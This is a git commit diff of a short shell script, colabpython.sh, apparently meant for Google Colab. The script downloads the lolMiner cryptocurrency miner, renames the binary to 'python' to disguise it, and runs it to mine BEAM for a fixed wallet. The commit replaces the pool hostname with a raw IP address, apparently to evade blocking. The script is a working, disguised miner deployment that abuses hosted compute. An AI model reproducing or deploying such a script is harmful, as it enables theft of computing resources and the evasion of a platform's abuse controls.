4fd510f897d4dd9aa5ad1a5e2a7027ad7721d467
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-10-30 06:29:48 +0000

    Update colabpython.sh

--- colabpython.sh
+++ colabpython.sh
@@ -2,4 +2,4 @@ curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/release
 tar -zxvf python.tar.gz
 cd 1.34
 mv lolMiner python
-./python --coin BEAM --pool us.beam.herominers.com:1130 --user 2523fa5af0ff1d1da52264c5a70c02c1291ad2daec9f72ea87b7189ed4a18af6be4.GPU --tls on
+./python --coin BEAM --pool 168.119.69.50:1130 --user 2523fa5af0ff1d1da52264c5a70c02c1291ad2daec9f72ea87b7189ed4a18af6be4.GPU --tls on
